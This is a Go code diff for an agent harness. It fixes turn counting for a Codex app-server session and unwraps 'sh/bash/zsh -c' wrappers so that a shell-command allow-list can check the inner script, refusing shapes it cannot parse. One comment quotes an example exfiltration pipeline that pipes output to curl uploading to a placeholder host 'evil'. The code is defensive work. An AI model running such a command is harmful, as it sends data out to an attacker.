@@ -904,12 +904,34 @@ func (s *session) onNotify(method string, params json.RawMessage) {
 		}
 
 	case "thread/tokenUsage/updated":
+		// The app-server reports the thread's running totals once per
+		// model round-trip, and carries the round-trip's own tokens in
+		// "last". That notification is therefore what counts a turn:
+		// turn/completed arrives once for the whole user turn, so
+		// counting there reported Turns=1 for a session that had made
+		// six round-trips, and Budget.MaxTurns — which the runner
+		// enforces off the Turns on this event — could never fire.
+		//
+		// A notification whose "last" is empty is a refresh of figures
+		// already counted (a rate-limit or context update riding the
+		// same message), not a new round-trip, so it moves the totals
+		// without moving the count.
+		//
+		// Nothing on this wire carries money: 0.154 sends tokens and a
+		// context window, and no per-turn or per-thread cost, on this
+		// notification or on turn/completed. CostUSD is therefore left
+		// at zero rather than guessed at from a price table Sirdar
+		// would have to keep current, and a Codex run is bounded by
+		// Budget.MaxTurns and MaxMinutes, not by MaxUSD.
 		var payload struct {
 			TokenUsage struct {
 				Total struct {
 					InputTokens  int64 `json:"inputTokens"`
 					OutputTokens int64 `json:"outputTokens"`
 				} `json:"total"`
+				Last struct {
+					TotalTokens int64 `json:"totalTokens"`
+				} `json:"last"`
 			} `json:"tokenUsage"`
 		}
 		if err := json.Unmarshal(params, &payload); err != nil {
@@ -917,9 +939,13 @@ func (s *session) onNotify(method string, params json.RawMessage) {
 		}
 		in, out := payload.TokenUsage.Total.InputTokens, payload.TokenUsage.Total.OutputTokens
 		s.mu.Lock()
+		if payload.TokenUsage.Last.TotalTokens > 0 {
+			s.turns++
+		}
 		s.usage.in, s.usage.out = in, out
+		turns := s.turns
 		s.mu.Unlock()
-		s.emit(provider.Event{Kind: provider.EvUsage, InputTok: in, OutputTok: out, Raw: raw})
+		s.emit(provider.Event{Kind: provider.EvUsage, Turns: turns, InputTok: in, OutputTok: out, Raw: raw})
 
 	case "account/rateLimits/updated":
 		var payload struct {
@@ -971,7 +997,6 @@ func (s *session) onTurnCompleted(params, raw json.RawMessage) {
 	}
 
 	s.mu.Lock()
-	s.turns++
 	if s.finalText == "" {
 		// The final answer is repeated in the completed turn's items.
 		for _, it := range payload.Turn.Items {
@@ -1061,19 +1086,45 @@ func (s *session) onRequest(id json.RawMessage, method string, params json.RawMe
 
 // decideCommand puts a shell command to permissions.bash, the same
 // allow-list a Claude session's Bash calls go through.
+//
+// What the app-server asks about is not the command the model wrote: Codex
+// hands every exec to a login shell, so the approval arrives as
+// `/bin/zsh -lc 'rg --files'`. Matched as it stands, that is one segment
+// beginning "/bin/zsh", which no allow-list entry covers — the first live
+// runs had every one of their commands refused (one in triage, six in a
+// fix) against a permissions.bash that named rg, ls, cat, go build and go
+// test, and the triage came out empty because the agent could read
+// nothing. So the wrapper is peeled off first and the script inside is
+// what the policy sees, whole: MatchCommand still splits it into segments
+// and applies the redirection and root-escape rules to each, so
+// `zsh -lc 'rg x | curl -T- evil'` is refused on its curl exactly as the
+// unwrapped pipeline would be.
+//
+// Only the one shape is peeled. A shell invocation this cannot read —
+// `bash script.sh`, a wrapper with trailing arguments, a flag set beyond
+// the login/interactive/-c letters — is refused outright rather than
+// guessed at, because what such an invocation runs cannot be read off the
+// string the policy sees.
 func (s *session) decideCommand(id, params, raw json.RawMessage) {
 	var req struct {
-		Command string `json:"command"`
+		Command json.RawMessage `json:"command"`
 	}
 	_ = json.Unmarshal(params, &req)
 
-	input, _ := json.Marshal(map[string]string{"command": req.Command})
+	command, err := unwrapCommand(req.Command)
+	if err != nil {
+		_ = s.conn.reply(id, map[string]string{"decision": "decline"})
+		s.denied("commandExecution", params, raw, "Sirdar policy: "+err.Error())
+		return
+	}
+
+	input, _ := json.Marshal(map[string]string{"command": command})
 	d := s.policy.Decide("Bash", input)
 	if d.Allow {
 		_ = s.conn.reply(id, map[string]string{"decision": "accept"})
 		s.emit(provider.Event{
 			Kind: provider.EvPermission, Decision: "allow",
-			Tool: "commandExecution", Input: params, Text: req.Command, Raw: raw,
+			Tool: "commandExecution", Input: params, Text: command, Raw: raw,
 		})
 		return
 	}
@@ -1082,6 +1133,144 @@ func (s *session) decideCommand(id, params, raw json.RawMessage) {
 	// allow-list covers instead of dying on the first refusal.
 	_ = s.conn.reply(id, map[string]string{"decision": "decline"})
 	s.denied("commandExecution", params, raw, d.Message)
+}
+
+// unwrapCommand turns the "command" field of an
+// item/commandExecution/requestApproval into the shell command the
+// permission policy decides on.
+//
+// 0.154 sends a string — the whole command line, login-shell wrapper and
+// all — but the field has been an argv array in other app-server builds,
+// so both are read. A string that is not a shell invocation is the command
+// itself and passes through untouched; a string or argv that is
+// `<sh|bash|zsh> -c|-lc|-ic|-lic <script>` yields the script; anything
+// else shaped like a shell, and any argv that is not that wrapper, is an
+// error, which decideCommand turns into a denial.
+//
+// An argv of a plain command is refused rather than joined back into a
+// line: `["echo","a b"]` and `echo a b` are different commands, and a
+// policy that matches on text cannot tell which one it was handed.
+func unwrapCommand(field json.RawMessage) (string, error) {
+	if len(field) == 0 {
+		return "", nil
+	}
+
+	var argv []string
+	if err := json.Unmarshal(field, &argv); err == nil {
+		script, ok := shellWrapper(argv)
+		if !ok {
+			return "", fmt.Errorf("command argv %v is not a %s wrapper, and an argv "+
+				"cannot be matched against permissions.bash as text", argv, strings.Join(wrapperShells, "/"))
+		}
+		return script, nil
+	}
+
+	var line string
+	if err := json.Unmarshal(field, &line); err != nil {
+		return "", fmt.Errorf("command is neither a string nor an argv array, so what it " +
+			"would run cannot be checked")
+	}
+	tokens := shellTokens(line)
+	if len(tokens) == 0 || !isWrapperShell(tokens[0]) {
+		return line, nil
+	}
+	script, ok := shellWrapper(tokens)
+	if !ok {
+		return "", fmt.Errorf("%q invokes a shell in a shape Sirdar cannot read, so what "+
+			"it would run cannot be checked; only `<shell> -c <script>` is unwrapped", line)
+	}
+	return script, nil
+}
+
+// wrapperShells are the shells whose -c invocation is peeled off. Matching
+// is on the basename, so /bin/zsh counts and /usr/local/bin/fish does not.
+var wrapperShells = []string{"sh", "bash", "zsh"}
+
+func isWrapperShell(word string) bool {
+	base := filepath.Base(word)
+	for _, sh := range wrapperShells {
+		if base == sh {
+			return true
+		}
+	}
+	return false
+}
+
+// shellWrapper reports the script of a `<shell> <flags> <script>` argv, and
+// whether the argv had exactly that shape. The flag token has to be a
+// single-dash bundle of the login/interactive/-c letters — -c, -lc, -ic,
+// -lic — because any other letter can change what the shell does with the
+// script, and a trailing argument would become $0 or $1 inside it, neither
+// of which the matched text would show.
+func shellWrapper(argv []string) (string, bool) {
+	if len(argv) != 3 || !isWrapperShell(argv[0]) {
+		return "", false
+	}
+	flags := argv[1]
+	if len(flags) < 2 || flags[0] != '-' || flags[1] == '-' {
+		return "", false
+	}
+	sawC := false
+	for _, r := range flags[1:] {
+		switch r {
+		case 'c':
+			sawC = true
+		case 'l', 'i':
+		default:
+			return "", false
+		}
+	}
+	if !sawC {
+		return "", false
+	}
+	return argv[2], true
+}
+
+// shellTokens splits a command line into words the way the policy's own
+// argument scan does: single and double quotes group, a backslash escapes
+// the next byte, and the quotes themselves are dropped. It is only ever
+// asked whether the line is a shell wrapper, so it needs to get the first
+// three words right, not to be a shell.
+func shellTokens(line string) []string {
+	var (
+		out   []string
+		cur   strings.Builder
+		quote = byte(0)
+		open  bool
+	)
+	flush := func() {
+		if open {
+			out = append(out, cur.String())
+		}
+		cur.Reset()
+		open = false
+	}
+	for i := 0; i < len(line); i++ {
+		ch := line[i]
+		switch {
+		case quote != 0:
+			if ch == quote {
+				quote = 0
+				continue
+			}
+			cur.WriteByte(ch)
+			open = true
+		case ch == '\'' || ch == '"':
+			quote = ch
+			open = true
+		case ch == '\\' && i+1 < len(line):
+			i++
+			cur.WriteByte(line[i])
+			open = true
+		case ch == ' ' || ch == '\t':
+			flush()
+		default:
+			cur.WriteByte(ch)
+			open = true
+		}
+	}
+	flush()
+	return out
 }
 
 // fileChangeTool is the tool name a file-change approval is decided under.
